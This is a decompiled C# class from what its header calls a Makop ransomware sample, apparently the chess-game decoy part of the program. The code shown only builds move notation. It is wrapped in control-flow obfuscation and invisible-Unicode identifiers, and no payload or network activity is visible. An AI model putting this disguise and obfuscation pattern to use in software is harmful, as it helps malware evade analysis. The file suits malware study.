// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.Notation
// Assembly: 0的, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9D533F7C-4FE9-47C1-AE3D-12E223DC01C7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-7b4b43d22be88ed3b2054ef7090ebb7b44ecc03dffa6c32e578002c9a12cbea8.exe

using System.Runtime.InteropServices;

namespace SimpleChessApp.Game
{
  public class Notation
  {
    public Square from;
    public Square to;

    public string Move
    {
      get
      {
label_1:
        int num1 = -1294382151;
        string move;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -425916626)) % 4U)
          {
            case 0:
              num1 = (int) num2 * 1634077545 ^ 2081587003;
              continue;
            case 2:
              goto label_1;
            case 3:
              move = Notation.\u206F‎‭‬⁪‬⁯​⁮‍⁪​‌⁫⁭​‮‌​⁫⁮⁯​‭⁬‎‪‍‎‬‍​‌⁬‎⁬⁮​⁯⁯‮(this.from.CurrentSquare, \u003CModule\u003E.\u206D⁮‭⁮‪‎‌​⁯‪⁫⁪⁭⁪‪⁯‬​⁫​⁪⁬⁯⁭‭⁭⁯‎‌‮‎⁫‍⁪⁫⁯‭⁭⁮⁮‮<string>(507396818U), this.to.CurrentSquare);
              num1 = (int) num2 * 1213602209 ^ 1291111025;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return move;
      }
    }

    public Notation(Square f, Square t, Board bo)
    {
      Square square1 = new Square(f.File, f.Rank, bo);
      Square square2 = new Square(t.File, t.Rank, bo);
      square1.Piece = new ChessPiece(f, t.Piece.Kind, t.Piece.Color);
      square2.Piece = new ChessPiece(t, t.Piece.Kind, t.Piece.Color);
      this.from = square1;
      this.to = square2;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1264833416;
      string move;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 516564534)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1121154569 ^ 1231957760;
            continue;
          case 2:
            move = this.Move;
            num1 = (int) num2 * 150683373 ^ 1160398529;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return move;
    }

    static string \u206F‎‭‬⁪‬⁯​⁮‍⁪​‌⁫⁭​‮‌​⁫⁮⁯​‭⁬‎‪‍‎‬‍​‌⁬‎⁬⁮​⁯⁯‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
